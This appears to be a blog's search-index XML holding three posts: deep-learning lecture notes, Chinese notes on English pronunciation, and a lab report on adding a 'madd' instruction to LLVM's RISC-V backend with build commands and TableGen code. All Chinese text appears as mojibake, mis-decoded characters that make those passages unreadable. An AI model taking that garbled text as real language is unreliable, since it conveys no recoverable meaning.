<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>MIT6.191</title>
    <url>/2023/11/26/MIT6.191/</url>
    <content><![CDATA[<h1 id="SOME-OF-NOTES-FROM-THE-LECTURE"><a href="#SOME-OF-NOTES-FROM-THE-LECTURE" class="headerlink" title="SOME OF NOTES FROM THE LECTURE"></a>SOME OF NOTES FROM THE LECTURE</h1><h2 id="Deep-Generative-Modeling"><a href="#Deep-Generative-Modeling" class="headerlink" title="Deep Generative Modeling"></a>Deep Generative Modeling</h2><p><strong>Generative Modeling Goal</strong>: Take as input training samples from some distribution and learn a model that represents that distribution</p>
<p><strong>latent variable</strong>: They are not directly observable, but they are the true underlying features or explanatory factors</p>
<p><strong>Autoencoder</strong>: An <strong>autoencoder</strong> is a type of <a href="https://en.wikipedia.org/wiki/Artificial_neural_network">artificial neural network</a> used to learn <a href="https://en.wikipedia.org/wiki/Feature_learning">efficient codings</a> of unlabeled data (<a href="https://en.wikipedia.org/wiki/Unsupervised_learning">unsupervised learning</a>)</p>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/37/Autoencoder_schema.png/440px-Autoencoder_schema.png" alt="Autoencode"></p>
<p><strong>variational autoencoders(VAEs)</strong>:</p>
<p><img src="https://i.imgs.ovh/2023/12/13/meF1e.png" alt="image-20231213201111453"></p>
<p><strong>Generative Adversarial Networks(GANs)</strong>: GANs are a way to make a generative model by having two neural networks compete with each other.</p>
<p><strong>Dropout Layer</strong>:</p>
<p><img src="https://miro.medium.com/v2/resize:fit:1210/format:webp/1*wDGvx0z0-nEB8zQHykvwPw.png"></p>
<p><strong>Double Descent</strong>:</p>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d7/Double_descent_in_a_two-layer_neural_network_%28Figure_3a_from_Rocks_et_al._2022%29.png/840px-Double_descent_in_a_two-layer_neural_network_%28Figure_3a_from_Rocks_et_al._2022%29.png"></p>
<p><strong>Lipschitz</strong>:</p>
<p><img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/a7b2d5f533b6c4c8c63ce33c85d8763e4eaffbfd" alt="d_{Y}(f(x_{1}),f(x_{2}))\leq Kd_{X}(x_{1},x_{2}).">[<a href="https://en.wikipedia.org/wiki/Lipschitz_continuity#cite_note-3">3]</a></p>
<p><strong>Neural Tangent Kernels</strong>ï¼š(<a href="https://arxiv.org/abs/1806.07572">Jacot et al. 2018</a>) is a kernel to explain the evolution of neural networks during training via gradient descent.</p>
<p><strong>Effective dimension</strong>:</p>
<p><img src="https://i.imgs.ovh/2023/12/13/medR9.png"></p>
<p><strong>Liquid Neural Network(LNN)</strong>:A <a href="https://arxiv.org/pdf/2006.04439.pdf">Liquid Neural Network</a> is a time-continuous <a href="https://www.unite.ai/what-are-rnns-and-lstms-in-deep-learning/">Recurrent Neural Network (RNN)</a> that processes data sequentially, keeps the memory of past inputs, adjusts its behaviors based on new inputs, and can handle variable-length inputs to enhance the task-understanding capabilities of NNs.</p>
<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ol>
<li><a href="https://ai.stackexchange.com/questions/30304/what-does-it-mean-having-lipschitz-continuous-derivatives">What does it mean â€œhaving Lipschitz continuous derivativesâ€?</a></li>
<li><a href="https://towardsdatascience.com/understanding-variational-autoencoders-vaes-f70510919f73">Understanding Variational Autoencoders (VAEs)</a></li>
<li>[è¯¦ç»†è§£ææ·±åº¦å­¦ä¹ ä¸­çš„ Lipschitz æ¡ä»¶](<a href="https://zhuanlan.zhihu.com/p/389024283">è¯¦ç»†è§£ææ·±åº¦å­¦ä¹ ä¸­çš„ Lipschitz æ¡ä»¶ - çŸ¥ä¹ (zhihu.com)</a>)</li>
<li><a href="https://www.unite.ai/liquid-neural-networks-definition-applications-challenges/">Liquid Neural Networks: Definition, Applications, &amp; Challenges</a></li>
</ol>
]]></content>
      <categories>
        <category>Notes</category>
        <category>AI</category>
      </categories>
      <tags>
        <tag>Notes</tag>
        <tag>Deep Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>è‹±è¯­å­¦ä¹ ç¬”è®°</title>
    <url>/2023/11/20/%E8%8B%B1%E8%AF%AD%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<blockquote>
<p>å…³äºä¸è®°å½•ç‚¹ä»€ä¹ˆå°±ä»€ä¹ˆä¹Ÿè®°ä¸ä½è¿™ä»¶äº‹ã€‚</p>
</blockquote>
<h3 id="å­¦ä¹ è‹±è¯­çš„å›°å¢ƒ"><a href="#å­¦ä¹ è‹±è¯­çš„å›°å¢ƒ" class="headerlink" title="å­¦ä¹ è‹±è¯­çš„å›°å¢ƒ"></a>å­¦ä¹ è‹±è¯­çš„å›°å¢ƒ</h3><p>é˜…è¯»çš„é€Ÿåº¦æ¯”è¾ƒæ…¢ï¼Œæ—¶å¸¸ä¼šåœ¨å¿ƒé‡Œé»˜è¯»ï¼Œä½†æ˜¯ä¸»åŠ¨çœ‹å¿«ç‚¹ï¼Œåˆä¼šå¯¼è‡´å›«å›µåæ£ã€‚</p>
<p>å£è¯­å‘éŸ³ä¸æ ‡å‡†ï¼Œå¬åŠ›å®¹æ˜“ç†è§£å‡ºé”™ã€‚</p>
<h3 id="ç›®å‰çš„æ–¹æ³•"><a href="#ç›®å‰çš„æ–¹æ³•" class="headerlink" title="ç›®å‰çš„æ–¹æ³•"></a>ç›®å‰çš„æ–¹æ³•</h3><p>å•è¯&#x2F;å¥çš„ç§¯ç´¯ï¼ˆå•çº¯çš„è®°å¿†ï¼Œå¢¨å¢¨èƒŒå•è¯ï¼Œç»“åˆå¥å­ï¼Œéƒ¨åˆ†ç»“åˆè¯æ ¹ï¼‰ç›®å‰çš„è¿›åº¦æ˜¯ 100 w&#x2F;m, å·²ç»è¿ç»­èƒŒäº† 25 å¤©ï¼Œä½†è¿˜æ˜¯æœ‰ä¸€ç‚¹æ…¢ã€‚</p>
<h3 id="å…³äºå£è¯­-x2F-å¬åŠ›è¿™å›äº‹"><a href="#å…³äºå£è¯­-x2F-å¬åŠ›è¿™å›äº‹" class="headerlink" title="å…³äºå£è¯­&#x2F;å¬åŠ›è¿™å›äº‹"></a>å…³äºå£è¯­&#x2F;å¬åŠ›è¿™å›äº‹</h3><h4 id="éŸ³èŠ‚ï¼ˆSyllableï¼‰"><a href="#éŸ³èŠ‚ï¼ˆSyllableï¼‰" class="headerlink" title="éŸ³èŠ‚ï¼ˆSyllableï¼‰"></a>éŸ³èŠ‚ï¼ˆSyllableï¼‰</h4><p>æ¯ä¸ªéŸ³èŠ‚éƒ½åŒ…å«ä¸€ä¸ªå…ƒéŸ³è‹±æ ‡ï¼Œè¾…éŸ³åˆ™æ˜¯éŸ³èŠ‚çš„åˆ†ç•Œçº¿ã€‚</p>
<p>éŸ³èŠ‚çš„åˆ’åˆ†å¯ä»¥ç”¨ï¼ˆ-ï¼‰æˆ–ï¼ˆÂ·ï¼‰æ¥è¡¨ç¤ºã€‚</p>
<p>é—­éŸ³èŠ‚ï¼šä»¥è¾…éŸ³ç»“å°¾çš„éŸ³èŠ‚ã€‚</p>
<p>å¼€éŸ³èŠ‚ï¼šä»¥å…ƒéŸ³ç»“å°¾çš„éŸ³èŠ‚ã€‚</p>
<p>è¿™ä¿©åæ–‡ä¹Ÿï¼ˆè‡ªç„¶æ‹¼è¯»ï¼‰ä¸­æ¶‰åŠåˆ°ã€‚</p>
<h4 id="é‡éŸ³ï¼ˆWord-Stressï¼‰"><a href="#é‡éŸ³ï¼ˆWord-Stressï¼‰" class="headerlink" title="é‡éŸ³ï¼ˆWord Stressï¼‰"></a>é‡éŸ³ï¼ˆWord Stressï¼‰</h4><p>é‡éŸ³ç¬¦å·ï¼ˆËˆï¼‰ï¼Œæ¬¡é‡éŸ³ç¬¦å·ï¼ˆËŒï¼‰</p>
<h4 id="è‡ªç„¶æ‹¼è¯»ï¼ˆPhonicsï¼‰"><a href="#è‡ªç„¶æ‹¼è¯»ï¼ˆPhonicsï¼‰" class="headerlink" title="è‡ªç„¶æ‹¼è¯»ï¼ˆPhonicsï¼‰"></a>è‡ªç„¶æ‹¼è¯»ï¼ˆPhonicsï¼‰</h4><p><strong>å¾ˆå¤šéå¸¸è§„çš„æ‹¼è¯»ï¼Œä»éœ€ç§¯ç´¯</strong>ã€‚</p>
<p>å•ä¸ªè¾…éŸ³å­—æ¯åœ¨å•è¯ä¸­é€šå¸¸çš„è¯»æ³•ï¼ˆä»¥è‹±éŸ³ä¸ºä¾‹ï¼‰</p>
<p><img src="https://i.imgs.ovh/2023/11/20/Hu8BV.png"></p>
<p>è¾…éŸ³å­—æ¯ï¼ˆç»„åˆï¼‰åœ¨å•è¯ä¸­é€šå¸¸çš„è¯»æ³•ï¼ˆä»¥è‹±éŸ³ä¸ºä¾‹ï¼‰ </p>
<p><img src="https://i.imgs.ovh/2023/11/20/HuEvW.png"></p>
<p>å•ä¸ªå…ƒéŸ³å­—æ¯åœ¨å•è¯ä¸­çš„é€šå¸¸è¯»æ³•ï¼ˆä»¥è‹±éŸ³ä¸ºä¾‹ï¼‰ </p>
<p><img src="https://i.imgs.ovh/2023/11/20/HuD1J.png"></p>
<p> å…ƒéŸ³å­—æ¯ï¼ˆç»„åˆï¼‰åœ¨å•è¯ä¸­çš„é€šå¸¸è¯»æ³•ï¼ˆä»¥è‹±éŸ³ä¸ºä¾‹ï¼‰ </p>
<p><img src="https://i.imgs.ovh/2023/11/20/HudXI.png"></p>
<h4 id="èŠ‚å¥ï¼ˆRhythmï¼‰"><a href="#èŠ‚å¥ï¼ˆRhythmï¼‰" class="headerlink" title="èŠ‚å¥ï¼ˆRhythmï¼‰"></a>èŠ‚å¥ï¼ˆRhythmï¼‰</h4><p>è‹±è¯­ä¸åƒä¸­æ–‡çš„å‘éŸ³ï¼Œä¸­æ–‡æ¯ä¸ªå­—åŸºæœ¬éƒ½æ˜¯ä¸€ä¸ªéŸ³èŠ‚ï¼Œ<strong>æ¯ä¸ªéŸ³èŠ‚ç­‰æ—¶</strong>ï¼Œè€Œè‹±æ–‡ä¸€ä¸ªå•è¯å¯ä»¥æœ‰å¾ˆå¤šä¸ªéŸ³èŠ‚ï¼Œå…¶ä¸­<strong>é‡éŸ³éŸ³èŠ‚ç­‰æ—¶ã€‚</strong></p>
<p><strong>Rab</strong>bits <strong>eat</strong> <strong>car</strong>rots.<br>A <strong>rab</strong>bits is <strong>eat</strong>ing <strong>car</strong>rots.<br>The <strong>rab</strong>bits has been <strong>eat</strong>ing some of the <strong>car</strong>rots.</p>
<p>ä¸Šé¢çš„ä¾‹å­è¯»èµ·æ¥åº”è¯¥æ—¶é•¿ç›¸ç­‰ï¼Œå› ä¸ºé‡éŸ³éŸ³èŠ‚ç­‰å¼ã€‚</p>
<p>ç”±æ­¤å¼•ç”³å‡ºä¸€äº›å£è¯­çš„ä¹ æƒ¯ï¼Œè¿è¯»ï¼Œå¤±çˆ†ï¼Œå¼±è¯»ç­‰å†…å®¹ï¼Œåæ–‡ä¼šæ¶‰åŠã€‚</p>
<h4 id="å¼±è¯»ï¼ˆWeak-Formsï¼‰"><a href="#å¼±è¯»ï¼ˆWeak-Formsï¼‰" class="headerlink" title="å¼±è¯»ï¼ˆWeak Formsï¼‰"></a>å¼±è¯»ï¼ˆWeak Formsï¼‰</h4><p>å¼±è¯»æ—¶ï¼Œä¸­é—´çš„å…ƒéŸ³ä¸€èˆ¬å˜ä¸ºä¸­å¤®å…ƒéŸ³&#x2F;É™&#x2F; : å‘ƒå‘ƒå‘ƒå‘ƒğŸ˜…</p>
<p>1ã€ä»‹è¯ï¼šat, for, from, of, to;</p>
<p>2ã€å† è¯ï¼šan, some;</p>
<p>3ã€è¿è¯ï¼šand, but;</p>
<p>4ã€ä»£è¯ï¼šyou, us, them,her;</p>
<p>5ã€åŠ©åŠ¨è¯ï¼šam, are, have, has, do, does, would, can, could, should.</p>
<p>ä¸€äº›è¯ &#x2F;i:&#x2F; å˜ä¸º &#x2F;Éª&#x2F; :</p>
<p>æ¯”å¦‚ï¼šhe, me, sheï¼›</p>
<p>åœ¨å¥æœ«ï¼Œå¯¹æ¯”ï¼Œå¼ºè°ƒæ—¶ä¸èƒ½å¼±è¯»ã€‚</p>
<p>æˆ‘è®¤ä¸ºæ˜¯ä¸ºäº†åœ¨è¡¨è¾¾ç›¸åŒæ„æ€çš„æƒ…å†µä¸‹æé«˜è¯­é€Ÿï¼Œå¯èƒ½æ˜¯è¯­è¨€è‡ªç„¶çš„æ¼”å˜è¿‡ç¨‹ã€‚</p>
<h4 id="çˆ†ç ´éŸ³-x2F-å¡éŸ³ï¼ˆStopï¼‰"><a href="#çˆ†ç ´éŸ³-x2F-å¡éŸ³ï¼ˆStopï¼‰" class="headerlink" title="çˆ†ç ´éŸ³&#x2F;å¡éŸ³ï¼ˆStopï¼‰"></a>çˆ†ç ´éŸ³&#x2F;å¡éŸ³ï¼ˆStopï¼‰</h4><p><img src="https://i.imgs.ovh/2023/11/20/HOXF2.png" alt="QQæˆªå›¾20231120174836"></p>
<p>å¡éŸ³+éœ€æˆé˜»éŸ³&#x3D;ã€‹æ— å£°é™¤é˜»ï¼Œå‰ä¸€ä¸ªå¡éŸ³ä¸å‘éŸ³ä½†æ˜¯å ä¸€æ‹ã€‚</p>
<p>doctorï¼›friendlyï¼›</p>
<p>hot dogï¼›not good</p>
<p>bad dayï¼›big girlï¼›</p>
<p>not nowï¼›</p>
<p>å€¼å¾—æ³¨æ„è¿™ä¸ç­‰äºçœéŸ³ã€‚</p>
<h4 id="çœéŸ³ï¼ˆElisionï¼‰"><a href="#çœéŸ³ï¼ˆElisionï¼‰" class="headerlink" title="çœéŸ³ï¼ˆElisionï¼‰"></a>çœéŸ³ï¼ˆElisionï¼‰</h4><p>diff<strong>e</strong>rentï¼›int<strong>e</strong>resting æ²¡æœ‰è¯»å‡º &#x2F;É™&#x2F;ã€‚</p>
<p><img src="https://i.imgs.ovh/2023/11/20/HOrhj.png" alt="QQæˆªå›¾20231120180605"></p>
<p>last year å¯ä»¥æ˜¯èåŒ–ï¼Œä¹Ÿå¯ä»¥æ˜¯å¤±çˆ†ã€‚</p>
<h4 id="åŒåŒ–-amp-å¼‚åŒ–ï¼ˆAssimilation-amp-Dissimilationï¼‰"><a href="#åŒåŒ–-amp-å¼‚åŒ–ï¼ˆAssimilation-amp-Dissimilationï¼‰" class="headerlink" title="åŒåŒ–&amp;å¼‚åŒ–ï¼ˆAssimilation &amp; Dissimilationï¼‰"></a>åŒåŒ–&amp;å¼‚åŒ–ï¼ˆAssimilation &amp; Dissimilationï¼‰</h4><p>é€†è¡ŒåŒåŒ–ï¼ˆå‰é¢éŸ³å—åé¢å½±å“ï¼‰ï¼š</p>
<p>1ã€&#x2F;k&#x2F;+è¾…éŸ³ï¼›&#x2F;t&#x2F;+è¾…éŸ³ï¼›&#x2F;d&#x2F;+è¾…éŸ³ ä¸€ç§åŒåŒ–&#x2F;å¤±çˆ†ç°è±¡ã€‚</p>
<p>2ã€æµŠéŸ³ï¼ˆå£°å¸¦éœ‡åŠ¨ï¼‰å˜è½»éŸ³ï¼ˆå£°å¸¦ä¸éœ‡åŠ¨ï¼‰ï¼šhave toï¼›of course å…¶ä¸­ &#x2F;v&#x2F;&#x3D;&gt;&#x2F;f&#x2F;ã€‚</p>
<p>3ã€é¼»éŸ³ï¼šin person å…¶ä¸­ in è¯»æˆäº† imï¼Œå› ä¸º p è¦é—­åˆåŒå”‡ã€‚</p>
<p>é¡ºè¡ŒåŒåŒ–ï¼š</p>
<p>å£°å¸¦è¦ä¹ˆä¸€èµ·éœ‡åŠ¨ï¼Œè¦ä¹ˆä¸éœ‡åŠ¨ã€‚books &#x2F;bÊŠks&#x2F; ï¼›dogs &#x2F;dÉ”É¡z&#x2F;ï¼›</p>
<p>äº’ç›¸ä½œç”¨ï¼š</p>
<p>èåˆ</p>
<p><img src="https://i.imgs.ovh/2023/11/20/HO2UI.png" alt="QQæˆªå›¾20231120182613"></p>
<p>ç›¸åŒè¾…éŸ³</p>
<p>life forceï¼›fish shopï¼›black coffeeï¼›</p>
<p>å¼‚åŒ–ï¼š</p>
<p>é€æ°”éŸ³åè·Ÿä¸é€æ°”éŸ³ &#x2F;s&#x2F;+&#x2F;t&#x2F;ï¼›&#x2F;s&#x2F;+&#x2F;k&#x2F;ï¼›&#x2F;s&#x2F;+&#x2F;p&#x2F;</p>
<p>standï¼Œstickï¼›</p>
<p>skyï¼Œschoolï¼›</p>
<p>springï¼Œspecialï¼›</p>
<p>råŒ–ï¼š</p>
<p>surprise &#x3D;&gt; su(r)priseï¼›</p>
<p>particular&#x3D;&gt;pa(r)ticularï¼›</p>
<p>governor&#x3D;&gt;go(v)ernorï¼›</p>
<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>è¿™äº›è§„å¾‹ä¸€èˆ¬éƒ½æ˜¯æ¼”å˜è¿‡æ¥çš„ï¼Œç°åœ¨äººä»¬æ€»ç»“çš„ï¼Œå› æ­¤ä¹Ÿä¸å­˜åœ¨ä¸€ç§<strong>ä¸‡èƒ½å…¬å¼</strong>ï¼Œè¿˜æ˜¯éœ€è¦å¤šè¯»å¤šç»ƒ</p>
<h3 id="å¼•ç”¨"><a href="#å¼•ç”¨" class="headerlink" title="å¼•ç”¨"></a>å¼•ç”¨</h3><p><a href="https://www.bilibili.com/video/BV1rt4y197Dy">è‹±è¯­çš„èŠ‚å¥å’Œâ€ç­‰æ—¶æ€§â€(è¿™æ‰æ˜¯ä¸­å¼è‹±è¯­çš„ç½ªé­ç¥¸é¦–!)</a></p>
<p><a href="https://www.bilibili.com/video/BV11z4y197Cr/">[è‹±è¯­è¯­éŸ³æŠ€å·§] è¿è¯»: å¼±è¯»(è¶…é‡è¦!)(ä½ ä¸ä¼šæ²¡å¬è¯´è¿‡è¿™ä¸ªå§?) (Weak Forms)</a></p>
<p><a href="https://www.bilibili.com/video/BV1wZ4y1W7gQ/">[è‹±è¯­è¯­éŸ³æŠ€å·§] è¿è¯»: çœéŸ³(åéŸ³)(å–œæ¬¢å·æ‡’çš„è¿›æ¥!)(Elision, åŒ…æ‹¬H-Dropping, G-Dropping)</a></p>
<p><a href="https://www.bilibili.com/video/BV1aA411s7n6/">åˆ°åº•ä»€ä¹ˆæ˜¯â€ä¸å®Œå…¨çˆ†ç ´â€, â€œå¤±å»çˆ†ç ´â€, â€œæ— å£°é™¤é˜»â€?</a></p>
<p><a href="https://www.bilibili.com/video/BV1PQ4y1P7g4">[è‹±è¯­è¯­éŸ³æŠ€å·§] è¿è¯»: åŒåŒ– &amp; å¼‚åŒ–(Assimilation &amp; Dissimilation)(è¯­éŸ³åœ°é“çš„äººéƒ½æ‡‚!)</a></p>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>English</tag>
        <tag>Grammar</tag>
      </tags>
  </entry>
  <entry>
    <title>å¦‚ä½•ç»™ LLVM RISCV æ·»åŠ ä¸€æ¡â€œæŒ‡ä»¤â€ï¼ˆæ”¹è¿›ï¼‰</title>
    <url>/2023/10/24/%E6%95%A3%E8%A8%98-10-24-23/</url>
    <content><![CDATA[<h1 id="å®éªŒæŠ¥å‘Š-æ”¹è¿›"><a href="#å®éªŒæŠ¥å‘Š-æ”¹è¿›" class="headerlink" title="å®éªŒæŠ¥å‘Š(æ”¹è¿›)"></a>å®éªŒæŠ¥å‘Š(æ”¹è¿›)</h1><h2 id="å®éªŒè¦æ±‚"><a href="#å®éªŒè¦æ±‚" class="headerlink" title="å®éªŒè¦æ±‚"></a>å®éªŒè¦æ±‚</h2><ul>
<li><input checked="" disabled="" type="checkbox"> å®ŒæˆæŒ‡ä»¤ç¼–ç è®¾è®¡ï¼ˆ4åˆ†ï¼‰</li>
<li><input checked="" disabled="" type="checkbox"> èƒ½å¤Ÿé€šè¿‡è‡ªå·±ç¼–å†™çš„è‡³å°‘2ä¸ªæ­£ç¡®æ±‡ç¼–æµ‹è¯•ç¨‹åºï¼Œç”Ÿæˆæ­£ç¡®çš„maddæŒ‡ä»¤ç¼–ç ï¼ˆ4åˆ†ï¼‰</li>
<li><input checked="" disabled="" type="checkbox"> èƒ½å¤Ÿé€šè¿‡è‡ªå·±ç¼–å†™çš„è‡³å°‘2ä¸ªé”™è¯¯æ±‡ç¼–æµ‹è¯•ç¨‹åºï¼Œè¿›è¡Œé€‚å½“çš„é”™è¯¯å¤„ç†ï¼ˆ4åˆ†ï¼‰</li>
<li><input checked="" disabled="" type="checkbox"> èƒ½å¤Ÿé€šè¿‡è‡ªå·±ç¼–å†™çš„è‡³å°‘1ä¸ªCè¯­è¨€æµ‹è¯•ç¨‹åºï¼Œç”Ÿæˆæ­£ç¡®çš„maddæ±‡ç¼–æŒ‡ä»¤ï¼ˆ4åˆ†ï¼‰</li>
<li><input checked="" disabled="" type="checkbox"> ç¼–ç è§„èŒƒï¼Œé£æ ¼è‰¯å¥½ï¼Œæ³¨é‡Šé€‚å½“ï¼Œæ¶æ„åˆç†ï¼ˆ4åˆ†ï¼‰</li>
</ul>
<p>é¢å¤–å®Œæˆçš„</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> ä½¿ç”¨æ¯”è¾ƒåˆé€‚çš„æµ‹è¯•æ–¹æ³•</li>
<li><input checked="" disabled="" type="checkbox"> å¯ä»¥ç»™ llvm å‰ç«¯ä¹Ÿæ·»åŠ ç›¸åº”çš„æ”¯æŒï¼Œæ”¯æŒé«˜çº§è¯­è¨€çš„å†…è”æ±‡ç¼–æˆ–è€…å†…ç½®å‡½æ•°ç”Ÿæˆå¯¹åº”çš„æ±‡ç¼–</li>
</ul>
<h2 id="ä»£ç -Patch"><a href="#ä»£ç -Patch" class="headerlink" title="ä»£ç  Patch"></a>ä»£ç  Patch</h2><h3 id="ä¸»æ¨¡å—"><a href="#ä¸»æ¨¡å—" class="headerlink" title="ä¸»æ¨¡å—"></a>ä¸»æ¨¡å—</h3><pre class="line-numbers language-none"><code class="language-none">rt@rogerthat ~&#x2F;m&#x2F;llvm-project-llvmorg-13.0.0 (master)&gt; git format-patch 3c115231b000ed300a6f0551b5b30bd549d566f3
0001-Add-builtin-__builtin_riscv_madd.patch
0002-Edit-Emit-function-type-error-and-grammer-error.patch
0003-Repair-fix-int_riscv_madd-type.patch
0004-Edit-no-changes.patch
0005-Edit-edit-comment.patch
0006-Add-test-cases-instruction-ID-case.patch
0007-Info-submodule-updated.patch
0008-Edit-format-code.patch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="å­æ¨¡å—-ï¼ˆllvm-x2F-lib-x2F-Target-x2F-RISCVï¼‰"><a href="#å­æ¨¡å—-ï¼ˆllvm-x2F-lib-x2F-Target-x2F-RISCVï¼‰" class="headerlink" title="å­æ¨¡å— ï¼ˆllvm&#x2F;lib&#x2F;Target&#x2F;RISCVï¼‰"></a>å­æ¨¡å— ï¼ˆllvm&#x2F;lib&#x2F;Target&#x2F;RISCVï¼‰</h3><pre class="line-numbers language-none"><code class="language-none">rt@rogerthat ~&#x2F;m&#x2F;l&#x2F;l&#x2F;l&#x2F;T&#x2F;RISCV (master)&gt; git format-patch 60950388fdb2be61593e2552100ed49186cf6b14
0001-Add-Pat-intr-mov-MADD-to-RISCVInstrInfoM.td.patch
0002-Edit-MADD-duplicated.patch
0003-Add-MADDW-MADD.patch
0004-Edit-edit-format.patch
0005-Add-specific-instruction-error.patch
0006-ADD-new-madd-pattern.patch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="ä½¿ç”¨è¯´æ˜"><a href="#ä½¿ç”¨è¯´æ˜" class="headerlink" title="ä½¿ç”¨è¯´æ˜"></a>ä½¿ç”¨è¯´æ˜</h2><h3 id="å®‰è£…ä¸ç¼–è¯‘"><a href="#å®‰è£…ä¸ç¼–è¯‘" class="headerlink" title="å®‰è£…ä¸ç¼–è¯‘"></a>å®‰è£…ä¸ç¼–è¯‘</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">wget https:&#x2F;&#x2F;github.com&#x2F;llvm&#x2F;llvm-project&#x2F;archive&#x2F;refs&#x2F;tags&#x2F;llvmorg-13.0.0.tar.gz
tar -xzf llvmorg-13.0.0.tar.gz
cd llvm-project-llvmorg-13.0.0
mkdir build install 
cd build
cmake -DLLVM_ENABLE_PROJECTS&#x3D;&quot;clang&quot; \
	-DLLVM_TARGETS_TO_BUILD&#x3D;&quot;RISCV&quot; \
	-DCMAKE_BUILD_TYPE&#x3D;Debug \
	-DCMAKE_INSTALL_PREFIX&#x3D;(pwd)&#x2F;compile&#x2F;llvm-project-llvmorg-13.0.0&#x2F;install \
	..&#x2F;llvm
make -j3 &#x2F;&#x2F; æ€•ç‚¸å†…å­˜,32Gå†…å­˜8ä¸ªæ ¸ç¼–è¯‘åœ¨é“¾æ¥çš„æ—¶å€™å¾ˆå®¹æ˜“ç‚¸å†…å­˜<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="åº”ç”¨-patch"><a href="#åº”ç”¨-patch" class="headerlink" title="åº”ç”¨ patch"></a>åº”ç”¨ patch</h3><p><code>git apply $diff</code> æˆ–è€…</p>
<p><code>git am *.patch</code> </p>
<p><strong>æ³¨æ„æœ‰ä¸¤ä¸ªæ¨¡å—</strong></p>
<h2 id="æŒ‡ä»¤ç¼–ç "><a href="#æŒ‡ä»¤ç¼–ç " class="headerlink" title="æŒ‡ä»¤ç¼–ç "></a>æŒ‡ä»¤ç¼–ç </h2><p>ä¸åŒçš„æ–‡ä»¶ä»£è¡¨äº†ä¸åŒç±»å‹çš„æŒ‡ä»¤é›†æ‹“å±•ï¼Œç»è¿‡ä¸€ç•ªæŸ¥é˜…åï¼Œå†³å®šæŠŠ <code>madd</code> æŒ‡ä»¤æ·»åŠ åˆ° <code>M extention</code> ä¸­</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// llvm/lib/Target/RISCV/RISCVInstrInfoM.td</span>
<span class="token comment">// customized mul+add instruction</span>
def MADD    <span class="token operator">:</span> ALU_rr<span class="token operator">&lt;</span><span class="token number">0b1111111</span><span class="token punctuation">,</span> <span class="token number">0b111</span><span class="token punctuation">,</span> <span class="token string">"madd"</span><span class="token operator">></span><span class="token punctuation">,</span>
              Sched<span class="token operator">&lt;</span><span class="token punctuation">[</span>WriteIALU<span class="token punctuation">,</span> ReadIALU<span class="token punctuation">,</span> ReadIALU<span class="token punctuation">]</span><span class="token operator">></span><span class="token punctuation">;</span>
<span class="token comment">// customized 64 bit version</span>
def MADDW   <span class="token operator">:</span> ALUW_rr<span class="token operator">&lt;</span><span class="token number">0b1111111</span><span class="token punctuation">,</span> <span class="token number">0b111</span><span class="token punctuation">,</span> <span class="token string">"maddw"</span><span class="token operator">></span><span class="token punctuation">,</span>
              Sched<span class="token operator">&lt;</span><span class="token punctuation">[</span>WriteIALU<span class="token punctuation">,</span> ReadIALU<span class="token punctuation">,</span> ReadIALU<span class="token punctuation">]</span><span class="token operator">></span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æŒ‡ä»¤ç»§æ‰¿è‡ª <code>ALU_rr</code>ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œæœ‰ä¸€äº› propertiesï¼Œæ¯”å¦‚ <code>hasSideEffects</code>ï¼Œåœ¨ç»§æ‰¿çš„è¿‡ç¨‹ä¸­ï¼Œç¨‹åºä¼šæ£€æŸ¥æ˜¯å¦å†²çªã€‚æ¯ç§ properties æœ‰å¯¹åº”çš„å«ä¹‰</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// llvm/lib/Target/RISCV/RISCVInstrInfo.td</span>
let hasSideEffects <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> mayLoad <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> mayStore <span class="token operator">=</span> <span class="token number">0</span> in
<span class="token keyword">class</span> <span class="token class-name">ALU_rr</span><span class="token operator">&lt;</span>bits<span class="token operator">&lt;</span><span class="token number">7</span><span class="token operator">></span> funct7<span class="token punctuation">,</span> bits<span class="token operator">&lt;</span><span class="token number">3</span><span class="token operator">></span> funct3<span class="token punctuation">,</span> string opcodestr<span class="token operator">></span>
    <span class="token operator">:</span> RVInstR<span class="token operator">&lt;</span>funct7<span class="token punctuation">,</span> funct3<span class="token punctuation">,</span> OPC_OP<span class="token punctuation">,</span> <span class="token punctuation">(</span>outs GPR<span class="token operator">:</span>$rd<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>ins GPR<span class="token operator">:</span>$rs1<span class="token punctuation">,</span> GPR<span class="token operator">:</span>$rs2<span class="token punctuation">)</span><span class="token punctuation">,</span>
              opcodestr<span class="token punctuation">,</span> <span class="token string">"$rd, $rs1, $rs2"</span><span class="token operator">></span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// llvm/lib/Target/RISCV/RISCVInstrFormats.td</span>
